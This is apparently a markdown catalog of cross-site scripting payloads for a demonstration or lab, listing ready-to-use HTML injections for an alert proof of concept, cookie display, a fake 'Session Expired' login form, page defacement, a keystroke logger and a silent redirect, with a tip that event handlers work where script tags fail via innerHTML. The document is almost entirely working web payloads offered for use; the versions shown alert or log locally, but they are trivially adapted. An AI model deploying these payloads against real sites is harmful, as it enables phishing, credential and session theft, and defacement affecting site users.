# XSS Payload Catalog

## basic — Proof of concept

```html
<img src=x onerror="alert('XSS!')">
```

Note: `<script>alert('XSS')</script>` does NOT work via `innerHTML`. Use event handlers.

## cookie — Cookie theft demonstration

```html
<img src=x onerror="alert(document.cookie)">
```

## phishing — Fake login form injection

```html
<div style="background:white;padding:20px;border-radius:8px">
  <h3>Session Expired</h3>
  <p>Please log in again</p>
  <input type="text" placeholder="Username" style="width:100%;padding:8px;margin:4px 0">
  <input type="password" placeholder="Password" style="width:100%;padding:8px;margin:4px 0">
  <button onclick="alert('Stolen: ' + this.parentElement.querySelectorAll('input')[0].value)">Login</button>
</div>
```

## defacement — Page takeover

```html
<img src=x onerror="document.body.innerHTML='<h1 style=color:red;text-align:center;margin-top:40vh>Hacked!</h1>'">
```

## keylogger — Keystroke capture (educational)

```html
<img src=x onerror="document.onkeypress=function(e){console.log('Key: '+e.key)}">
```

## redirect — Silent redirect

```html
<img src=x onerror="window.location='https://example.com'">
```
